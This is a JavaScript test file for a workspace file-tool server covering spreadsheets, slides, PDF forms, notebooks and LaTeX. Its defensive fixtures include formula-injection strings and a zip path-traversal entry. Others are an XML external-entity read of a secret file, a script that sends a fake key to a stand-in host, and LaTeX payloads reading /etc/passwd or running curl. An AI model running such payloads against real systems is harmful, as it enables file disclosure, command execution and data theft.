import assert from 'node:assert/strict';
import test, { after } from 'node:test';
import fs from 'node:fs/promises';
import path from 'node:path';
import os from 'node:os';
import { PDFDocument } from 'pdf-lib';
import ExcelJS from 'exceljs';
import JSZip from 'jszip';

const root = await fs.mkdtemp(path.join(os.tmpdir(), 'zh-file-capabilities-'));
process.env.DATA_DIR = root;
const { createDocument } = await import('../src/server/documents.mjs');
const { executeFileCapability, readWorkspaceBinary, scanArtifact } = await import('../src/server/file-tools.mjs');
const { extractText } = await import('../src/server/extract/index.mjs');
const { readOfficeZip } = await import('../src/server/extract/office-zip.mjs');
const { validateLatexSource, latexAvailability } = await import('../src/server/docgen/latex.mjs');
const { writeArtifact, resolveSafe } = await import('../src/server/workspace.mjs');
after(() => fs.rm(root, { recursive: true, force: true }));
const ctx = { userId: 'alice' };

test('binary read rejects a file replaced with one of the same size and timestamp mid-read', async t => {
  const name = 'snapshot.bin';
  const replacement = 'replacement.bin';
  await writeArtifact('alice', name, Buffer.from('first'));
  await writeArtifact('alice', replacement, Buffer.from('other'));
  const originalPath = resolveSafe('alice', name).abs;
  const replacementPath = resolveSafe('alice', replacement).abs;
  const stamp = new Date('2024-01-01T00:00:00Z');
  await fs.utimes(originalPath, stamp, stamp);
  await fs.utimes(replacementPath, stamp, stamp);
  const open = fs.open.bind(fs);
  let replaced = false;
  t.mock.method(fs, 'open', async (...args) => {
    const file = await open(...args);
    if (args[0] === originalPath && !replaced) {
      const read = file.read.bind(file);
      t.mock.method(file, 'read', async (...readArgs) => {
        const result = await read(...readArgs);
        if (!replaced) {
          await fs.rename(originalPath, originalPath + '.previous');
          await fs.rename(replacementPath, originalPath);
          replaced = true;
        }
        return result;
      });
    }
    return file;
  });
  await assert.rejects(readWorkspaceBinary('alice', name), /workspace_file_changed/);
  assert.equal(replaced, true);
  assert.deepEqual(await readWorkspaceBinary('alice', name), Buffer.from('other'));
});

test('XLSX is readable with ExcelJS and bounded extractor, strings never become formulas', async () => {
  const rows = [['命题', '计数', '备注'], ['形式验证', 42, '=HYPERLINK("https://evil.invalid")'], ['安全', true, '@SUM(A1:A9)']];
  const result = await createDocument('alice', { path: '研究数据.xlsx', title: '证据矩阵', rows });
  assert.equal(result.ok, true, result.message);
  const bytes = await readWorkspaceBinary('alice', result.path);
  const book = new ExcelJS.Workbook(); await book.xlsx.load(bytes);
  assert.equal(book.worksheets[0].getCell('B2').value, 42);
  assert.equal(book.worksheets[0].getCell('C2').type, ExcelJS.ValueType.String);
  assert.equal(book.worksheets[0].getCell('C2').value, rows[1][2]);
  const extracted = await extractText(bytes, result.path);
  assert.match(extracted.text, /形式验证/); assert.match(extracted.text, /B2: 42/);
  assert.equal((await createDocument('alice', { path: result.path, rows })).code, 'exists');
  const invalid = await createDocument('alice', { path: 'bad.xlsx', rows: [['header'], [{ formula: 'WEBSERVICE("x")' }]] });
  assert.equal(invalid.ok, false);
  const references = await createDocument('alice', { path: 'references.xlsx', markdown: '| 结论 |\n|---|\n| 有来源 [[ref_one]] |' }, { evidence: new Map([['ref_one', { title: '原始文献', sourceUrl: 'https://example.org/paper', authority: { evidenceLevel: 'abstract' } }]]) });
  assert.equal(references.ok, true, references.message);
  const referenceText = await extractText(await readWorkspaceBinary('alice', references.path), references.path);
  assert.match(referenceText.text, /原始文献/); assert.match(referenceText.text, /仅摘要/);
  assert.equal((await createDocument('alice', { path: 'fake-ref.xlsx', rows: [['结论'], ['虚构 [[made_up]]']] })).ok, false);
});

test('XLSX markdown and PPTX are real OOXML files with Chinese content', async () => {
  const markdown = '## 研究结论\n\n形式验证支持按规范推理。\n\n| 方法 | 证据 |\n|---|---|\n| 演绎 | 规则 |\n\n## 局限\n\n未知不等于否定。';
  for (const ext of ['xlsx', 'pptx']) {
    const result = await createDocument('alice', { path: '简报.' + ext, title: '知衡研究', markdown });
    assert.equal(result.ok, true, result.message);
    const bytes = await readWorkspaceBinary('alice', result.path), entries = readOfficeZip(bytes);
    assert.ok(entries.has('[Content_Types].xml'));
    const text = await extractText(bytes, result.path); assert.match(text.text, /演绎/);
    if (ext === 'pptx') { assert.ok(text.pages >= 3); assert.match(text.text, /未知不等于否定/); }
  }
});

test('Office parser refuses path traversal, enormous inflate, DTD and damaged CRC', async () => {
  let zip = new JSZip(); zip.file('../escape.xml', 'bad');
  await assert.rejects(async () => readOfficeZip(await zip.generateAsync({ type: 'nodebuffer' })), /unsafe_zip_path/);
  zip = new JSZip(); zip.file('xl/workbook.xml', '<!DOCTYPE x [<!ENTITY e SYSTEM "file:///secret">]><x/>');
  await assert.rejects(async () => readOfficeZip(await zip.generateAsync({ type: 'nodebuffer' })), /xml_entity/);
  zip = new JSZip(); zip.file('large.xml', 'x'.repeat(1024 * 1024));
  const large = await zip.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE' });
  assert.throws(() => readOfficeZip(large, { maxBytes: 4096 }), /zip_budget/);
  zip = new JSZip(); zip.file('one.xml', '<one/>'); const corrupt = await zip.generateAsync({ type: 'nodebuffer' });
  corrupt[30 + 'one.xml'.length] ^= 1;
  assert.throws(() => readOfficeZip(corrupt), /corrupt_zip_member/);
});

test('PDF inspect/fill uses actual AcroForms; split/merge preserves page counts', async () => {
  const pdf = await PDFDocument.create(); const page = pdf.addPage([400, 400]); pdf.addPage([400, 400]);
  const form = pdf.getForm(); form.createTextField('name').addToPage(page, { x: 30, y: 320, width: 200, height: 30 }); form.createCheckBox('approved').addToPage(page, { x: 30, y: 280, width: 20, height: 20 });
  await writeArtifact('alice', 'input.pdf', Buffer.from(await pdf.save()));
  const info = await executeFileCapability('pdf_inspect', { path: 'input.pdf' }, ctx);
  assert.equal(info.ok, true, info.text); assert.equal(info.pages, 2); assert.equal(info.fields.length, 2);
  let result = await executeFileCapability('pdf_fill', { path: 'input.pdf', output_path: 'filled.pdf', fields: { name: 'Ada Lovelace', approved: true } }, ctx);
  assert.equal(result.ok, true, result.text);
  const filled = await PDFDocument.load(await readWorkspaceBinary('alice', 'filled.pdf'));
  assert.equal(filled.getForm().getTextField('name').getText(), 'Ada Lovelace'); assert.equal(filled.getForm().getCheckBox('approved').isChecked(), true);
  result = await executeFileCapability('pdf_fill', { path: 'filled.pdf', output_path: 'flat.pdf', fields: { name: 'Ada' }, flatten: true }, ctx); assert.equal(result.ok, true, result.text);
  result = await executeFileCapability('pdf_split', { path: 'flat.pdf', output_path: 'split.pdf', pages: [2] }, ctx); assert.equal(result.pages, 1, result.text);
  result = await executeFileCapability('pdf_merge', { paths: ['flat.pdf', 'split.pdf'], output_path: 'merged.pdf' }, ctx); assert.equal(result.pages, 3, result.text);
  assert.equal((await PDFDocument.load(await readWorkspaceBinary('alice', 'merged.pdf'))).getPageCount(), 3);
  result = await executeFileCapability('pdf_fill', { path: 'input.pdf', output_path: 'input.pdf', fields: { name: 'overwrite' } }, ctx); assert.equal(result.ok, false);
  result = await executeFileCapability('pdf_split', { path: 'flat.pdf', output_path: 'range.pdf', pages: [999] }, ctx); assert.equal(result.ok, false);
});

test('file capabilities deny another user, traversal, corrupt files and cancellation', async () => {
  for (const args of [{ path: '../alice/input.pdf' }, { path: 'input.pdf' }]) {
    const result = await executeFileCapability('pdf_inspect', args, { userId: 'bob' }); assert.equal(result.ok, false);
  }
  await writeArtifact('alice', 'corrupt.pdf', Buffer.from('not a pdf'));
  assert.equal((await executeFileCapability('pdf_inspect', { path: 'corrupt.pdf' }, ctx)).ok, false);
  const controller = new AbortController(); controller.abort();
  await assert.rejects(() => executeFileCapability('pdf_split', { path: 'flat.pdf', output_path: 'cancelled.pdf', pages: [1] }, { ...ctx, signal: controller.signal }), /abort/i);
  await assert.rejects(() => fs.stat(resolveSafe('alice', 'cancelled.pdf').abs), { code: 'ENOENT' });
  await assert.rejects(() => createDocument('alice', { path: 'cancel.xlsx', rows: [['hi']] }, { signal: controller.signal }), /abort/i);
});

test('notebooks are edited with revisions and never execute or preserve trusted outputs', async () => {
  const notebook = { nbformat: 4, nbformat_minor: 5, metadata: { trusted: true }, cells: [{ cell_type: 'code', metadata: { trusted: true }, source: ['print("hello")'], outputs: [{ output_type: 'display_data', data: { 'text/html': '<script>bad()</script>' }, metadata: {} }], execution_count: 7 }] };
  await writeArtifact('alice', 'research.ipynb', Buffer.from(JSON.stringify(notebook)));
  const read = await executeFileCapability('notebook_read', { path: 'research.ipynb' }, ctx); assert.equal(read.executed, false); assert.equal(read.cells[0].source, 'print("hello")');
  const extracted = await extractText(Buffer.from(JSON.stringify(notebook)), 'research.ipynb'); assert.ok(!extracted.text.includes('<script>'));
  let result = await executeFileCapability('notebook_edit', { path: 'research.ipynb', output_path: 'edited.ipynb', cell_index: 0, revision: '0'.repeat(64), source: 'print(1)' }, ctx); assert.equal(result.ok, false);
  result = await executeFileCapability('notebook_edit', { path: 'research.ipynb', output_path: 'edited.ipynb', cell_index: 0, revision: read.revision, source: 'raise RuntimeError("never executed")' }, ctx); assert.equal(result.ok, true, result.text);
  const edited = JSON.parse(await readWorkspaceBinary('alice', 'edited.ipynb')); assert.deepEqual(edited.cells[0].outputs, []); assert.equal(edited.cells[0].execution_count, null); assert.deepEqual(edited.metadata, {});
});

test('artifact scanner reports warning categories without copying credentials or sending contents', async () => {
  const secret = 'sk-' + 'fixture'.repeat(8); const calls = [];
  await writeArtifact('alice', 'suspicious.html', Buffer.from('<script>fetch("https://example.invalid",{body:"' + secret + '"})</script>'));
  const scan = await scanArtifact('alice', 'suspicious.html', { audit: async e => calls.push(e) });
  assert.equal(scan.status, 'warning'); assert.ok(scan.findings.some(f => f.code === 'possible_credential')); assert.equal(JSON.stringify([scan, calls]).includes(secret), false); assert.equal(calls.length, 1);
});

test('LaTeX is conditional, rejects dynamic/file/shell constructs before execution', async () => {
  assert.equal(validateLatexSource('\\documentclass{article}\n\\usepackage{amsmath}\n\\begin{document}$a \\land b$\\end{document}'), true);
  for (const attack of ['\\input{/etc/passwd}', '\\write18{curl bad}', '\\csname input\\endcsname', '\\begin{filecontents}{x}bad\\end{filecontents}', '\\^^69nput{bad}', '\\documentclass{evil}']) {
    assert.throws(() => validateLatexSource('\\documentclass{article}\n' + attack));
  }
  const previous = process.env.LATEX_ENGINE_PATH; delete process.env.LATEX_ENGINE_PATH;
  try { assert.equal((await latexAvailability()).available, false); const result = await executeFileCapability('latex_compile', { source_path: 'a.tex', output_path: 'a.pdf' }, ctx); assert.equal(result.code, 'unavailable'); }
  finally { if (previous !== undefined) process.env.LATEX_ENGINE_PATH = previous; }
});
